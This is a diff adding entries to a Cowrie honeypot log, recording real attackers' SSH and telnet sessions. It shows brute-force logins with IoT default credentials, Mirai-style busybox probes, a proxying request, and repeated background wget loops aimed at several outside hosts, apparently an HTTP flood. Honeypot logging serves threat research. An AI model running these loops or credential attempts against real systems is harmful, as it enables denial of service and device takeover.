@@ -798,3 +798,157 @@
 2017-04-11T05:29:59+0000 [CowrieTelnetTransport,222308,198.7.62.232] Connection lost after 55 seconds
 2017-04-11T05:30:00+0000 [CowrieTelnetTransport,222311,198.7.62.232] login attempt: 13091
 2017-04-11T05:30:00+0000 [CowrieTelnetTransport,222311,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-11T05:30:02+0000 [CowrieTelnetTransport,222311,198.7.62.232] login attempt [sh//bin/busybox ECCHI] failed
+2017-04-11T05:30:02+0000 [CowrieTelnetTransport,222311,198.7.62.232] Warning: state changed and new state returned
+2017-04-11T05:30:02+0000 [HoneyPotSSHTransport,103424,58.218.199.133] Remote SSH version: SSH-2.0-PUTTY
+2017-04-11T05:30:02+0000 [HoneyPotSSHTransport,103424,58.218.199.133] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-11T05:30:02+0000 [HoneyPotSSHTransport,103424,58.218.199.133] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T05:30:02+0000 [HoneyPotSSHTransport,103424,58.218.199.133] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T05:30:03+0000 [HoneyPotSSHTransport,103424,58.218.199.133] NEW KEYS
+2017-04-11T05:30:03+0000 [HoneyPotSSHTransport,103424,58.218.199.133] starting service 'ssh-userauth'
+2017-04-11T05:30:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,103424,58.218.199.133] 'root' trying auth 'none'
+2017-04-11T05:30:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,103424,58.218.199.133] 'root' authenticated with 'none'
+2017-04-11T05:30:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,103424,58.218.199.133] starting service 'ssh-connection'
+2017-04-11T05:30:05+0000 [HoneyPotSSHTransport,103424,58.218.199.133] Got remote error, code 11
+	reason: 
+2017-04-11T05:30:05+0000 [HoneyPotSSHTransport,103424,58.218.199.133] avatar root logging out
+2017-04-11T05:30:05+0000 [HoneyPotSSHTransport,103424,58.218.199.133] connection lost
+2017-04-11T05:30:05+0000 [HoneyPotSSHTransport,103424,58.218.199.133] Connection lost after 5 seconds
+2017-04-11T05:30:08+0000 [CowrieTelnetTransport,222309,198.7.62.232] Connection lost after 51 seconds
+2017-04-11T05:30:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103332,91.195.103.185] got channel 'direct-tcpip' request
+2017-04-11T05:30:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,103332,91.195.103.185] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
+2017-04-11T05:30:10+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103332,91.195.103.185] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=16094642248&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 16094642248\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
+2017-04-11T05:30:10+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103332,91.195.103.185] failed to connect: Connection refused
+2017-04-11T05:30:10+0000 [SSHChannel None (31) on SSHService 'ssh-connection' on HoneyPotSSHTransport,103332,91.195.103.185] sending close 31
+2017-04-11T05:30:10+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: shell
+2017-04-11T05:30:10+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: shell
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: enable
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: enable 
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: system
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: system
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh 
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: run
+2017-04-11T05:30:11+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: run
+2017-04-11T05:30:14+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 198.7.62.232:46364 (10.8.41.81:2223) [session: TT222313]
+2017-04-11T05:30:19+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt: 13092
+2017-04-11T05:30:19+0000 [CowrieTelnetTransport,222313,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-11T05:30:21+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt [admin/meinsm] failed
+2017-04-11T05:30:21+0000 [CowrieTelnetTransport,222313,198.7.62.232] Warning: state changed and new state returned
+2017-04-11T05:30:22+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt: 13093
+2017-04-11T05:30:22+0000 [CowrieTelnetTransport,222313,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-11T05:30:24+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt [enable/shell] failed
+2017-04-11T05:30:24+0000 [CowrieTelnetTransport,222313,198.7.62.232] Warning: state changed and new state returned
+2017-04-11T05:30:26+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt: 13094
+2017-04-11T05:30:26+0000 [CowrieTelnetTransport,222313,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222313,198.7.62.232] login attempt [sh//bin/busybox ECCHI] failed
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222313,198.7.62.232] Warning: state changed and new state returned
+2017-04-11T05:30:29+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.199.133:27235 (10.8.41.81:2222) [session: b23afa5a]
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://69.12.80.118:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done" &
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222310,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://tranquilseas.com:80/ > /dev/null 2> /dev/null; done"
+2017-04-11T05:30:29+0000 [HoneyPotSSHTransport,103425,58.218.199.133] Got remote error, code 11
+	reason: 
+2017-04-11T05:30:29+0000 [HoneyPotSSHTransport,103425,58.218.199.133] connection lost
+2017-04-11T05:30:29+0000 [HoneyPotSSHTransport,103425,58.218.199.133] Connection lost after 0 seconds
+2017-04-11T05:30:29+0000 [CowrieTelnetTransport,222312,198.7.62.232] Connection lost after 52 seconds
+2017-04-11T05:30:34+0000 [CowrieTelnetTransport,222311,198.7.62.232] Connection lost after 57 seconds
+2017-04-11T05:30:36+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 109.187.198.78:49723 (10.8.41.81:2223) [session: TT222314]
+2017-04-11T05:30:36+0000 [CowrieTelnetTransport,222314,109.187.198.78] first time for 109.187.198.78, need: 1
+2017-04-11T05:30:36+0000 [CowrieTelnetTransport,222314,109.187.198.78] login attempt: 1
+2017-04-11T05:30:38+0000 [CowrieTelnetTransport,222314,109.187.198.78] login attempt [root/xc3511] succeeded
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] Opening TTY Log: log/tty/20170411-053040-None-222314i.log
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] Warning: state changed and new state returned
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] Received unhandled keyID: '\x00'
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] CMD: enable
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] Command found: enable 
+2017-04-11T05:30:40+0000 [CowrieTelnetTransport,222314,109.187.198.78] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Received unhandled keyID: '\x00'
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] CMD: system
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Command not found: system
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Received unhandled keyID: '\x00'
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] CMD: shell
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Command not found: shell
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Received unhandled keyID: '\x00'
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] CMD: sh
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Command found: sh 
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Received unhandled keyID: '\x00'
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] CMD: /bin/busybox MIRAI
+2017-04-11T05:30:41+0000 [CowrieTelnetTransport,222314,109.187.198.78] Command found: /bin/busybox MIRAI
+2017-04-11T05:30:42+0000 [CowrieTelnetTransport,222314,109.187.198.78] Closing TTY Log: log/tty/20170411-053040-None-222314i.log after 1 seconds
+2017-04-11T05:30:42+0000 [CowrieTelnetTransport,222314,109.187.198.78] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-11T05:30:42+0000 [CowrieTelnetTransport,222314,109.187.198.78] Connection lost after 5 seconds
+2017-04-11T05:30:42+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.165.29.29:59153 (10.8.41.81:2223) [session: TT222315]
+2017-04-11T05:30:46+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt: 8
+2017-04-11T05:30:46+0000 [CowrieTelnetTransport,222315,185.165.29.29] login return, expect: [operator/operator]
+2017-04-11T05:30:48+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt [root/xc3511] failed
+2017-04-11T05:30:48+0000 [CowrieTelnetTransport,222315,185.165.29.29] Warning: state changed and new state returned
+2017-04-11T05:30:48+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 58.218.199.133:14660 (10.8.41.81:2222) [session: 8c442c5f]
+2017-04-11T05:30:48+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt: 9
+2017-04-11T05:30:48+0000 [CowrieTelnetTransport,222315,185.165.29.29] login return, expect: [operator/operator]
+2017-04-11T05:30:51+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt [enable/shell] failed
+2017-04-11T05:30:51+0000 [CowrieTelnetTransport,222315,185.165.29.29] Warning: state changed and new state returned
+2017-04-11T05:30:51+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt: 10
+2017-04-11T05:30:51+0000 [CowrieTelnetTransport,222315,185.165.29.29] login return, expect: [operator/operator]
+2017-04-11T05:30:53+0000 [CowrieTelnetTransport,222315,185.165.29.29] login attempt [sh//bin/busybox ECCHI] failed
+2017-04-11T05:30:53+0000 [CowrieTelnetTransport,222315,185.165.29.29] Warning: state changed and new state returned
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] Remote SSH version: SSH-2.0-PUTTY
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] connection lost
+2017-04-11T05:30:53+0000 [HoneyPotSSHTransport,103426,58.218.199.133] Connection lost after 5 seconds
+2017-04-11T05:30:59+0000 [CowrieTelnetTransport,222313,198.7.62.232] Connection lost after 45 seconds
